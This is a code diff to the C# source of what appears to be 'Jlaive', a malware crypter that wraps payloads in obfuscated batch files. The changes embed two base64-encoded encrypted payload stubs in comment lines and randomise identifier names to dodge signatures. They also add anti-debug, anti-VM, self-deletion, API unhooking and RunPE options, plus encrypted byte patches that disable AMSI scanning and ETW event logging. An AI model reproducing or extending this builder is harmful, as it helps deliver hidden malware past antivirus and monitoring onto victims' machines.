@@ -23,7 +23,7 @@ namespace Jlaive
             rngstr = new RandomString(rng);
         }
 
-        public string CreateBat(string pscommand, byte[] stub, bool hidden, bool runas)
+        public string CreateBat(string pscommand, byte[] stub, byte[] stub2, bool hidden, bool runas)
         {
             StringBuilder builder = new StringBuilder();
             builder.AppendLine("@echo off");
@@ -43,7 +43,7 @@ namespace Jlaive
             builder.Append("exit /b");
             string obfuscated = new FileObfuscation().Process(builder.ToString(), 3);
             List<string> lines = new List<string>(obfuscated.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
-            lines.Insert(rng.Next(0, lines.Count), $":: {Convert.ToBase64String(stub)}");
+            lines.Insert(rng.Next(0, lines.Count), $":: {Convert.ToBase64String(stub)}\\{Convert.ToBase64String(stub2)}");
             return string.Join(Environment.NewLine, lines);
         }
 
@@ -58,7 +58,14 @@ namespace Jlaive
                 { "contents_var", rngstr.Get(5) },
                 { "lastline_var", rngstr.Get(5) },
                 { "line_var", rngstr.Get(5) },
-                { "payload_var", rngstr.Get(5) },
+                { "payloads_var", rngstr.Get(5) },
+                { "payload1_var", rngstr.Get(5) },
+                { "payload2_var", rngstr.Get(5) },
+                { "decrypt_function", rngstr.Get(5) },
+                { "decompress_function", rngstr.Get(5) },
+                { "execute_function", rngstr.Get(5) },
+                { "param_var", rngstr.Get(5) },
+                { "param2_var", rngstr.Get(5) },
                 { "aes_var", rngstr.Get(5) },
                 { "decryptor_var", rngstr.Get(5) },
                 { "msi_var", rngstr.Get(5) },
@@ -71,38 +78,36 @@ namespace Jlaive
             return replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.Stub.ps1"), (c, r) => c.Replace(r.Key, r.Value));
         }
 
-        public string CreateCS(bool antidebug, bool antivm, bool meltfile, bool native)
+        public string CreateCS(bool antidebug, bool antivm, bool meltfile, bool unhookapi, bool native)
         {
             StringBuilder builder = new StringBuilder();
             if (antidebug) builder.AppendLine("#define ANTI_DEBUG");
             if (antivm) builder.AppendLine("#define ANTI_VM");
             if (native) builder.AppendLine("#define USE_RUNPE");
             if (meltfile) builder.AppendLine("#define MELT_FILE");
+            if (unhookapi) builder.AppendLine("#define UNHOOK_API");
+            builder.AppendLine(GetEmbeddedString("Jlaive.Resources.Stub.cs"));
+            return builder.ToString();
+        }
+
+        public string CreateBCS()
+        {
+            StringBuilder builder = new StringBuilder();
             var replacements = new Dictionary<string, string> {
                 { "namespace_name", rngstr.Get(20) },
                 { "class_name", rngstr.Get(20) },
-                { "field_name", rngstr.Get(20) },
-                { "exitfunction_name", rngstr.Get(20) },
                 { "aesfunction_name", rngstr.Get(20) },
-                { "uncompressfunction_name", rngstr.Get(20) },
-                { "getembeddedresourcefunction_name", rngstr.Get(20) },
-                { "bypassfunction_name", rngstr.Get(20) },
                 { "virtualprotect_name", rngstr.Get(20) },
-                { "checkremotedebugger_name", rngstr.Get(20) },
-                { "isdebuggerpresent_name", rngstr.Get(20) },
                 { "amsiscanbuffer_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), Key, IV)) },
                 { "etweventwrite_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("EtwEventWrite"), Key, IV)) },
-                { "checkremotedebugger_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), Key, IV)) },
-                { "isdebuggerpresent_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), Key, IV)) },
-                { "payloadexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("payload.exe"), Key, IV)) },
-                { "runpedllexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.dll"), Key, IV)) },
-                { "runpeclass_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.RunPE"), Key, IV)) },
-                { "runpefunction_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("ExecutePE"), Key, IV)) },
-                { "cmdcommand_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h -s \""), Key, IV)) },
+                { "amsi64patch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, Key, IV)) },
+                { "amsipatch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, Key, IV)) },
+                { "etw64patch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xC3 }, Key, IV)) },
+                { "etwpatch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xC2, 0x14, 0x00 }, Key, IV)) },
                 { "key_str", Convert.ToBase64String(Key) },
                 { "iv_str", Convert.ToBase64String(IV) }
             };
-            builder.AppendLine(replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.Stub.cs"), (c, r) => c.Replace(r.Key, r.Value)));
+            builder.AppendLine(replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.BStub.cs"), (c, r) => c.Replace(r.Key, r.Value)));
             return builder.ToString();
         }
     }
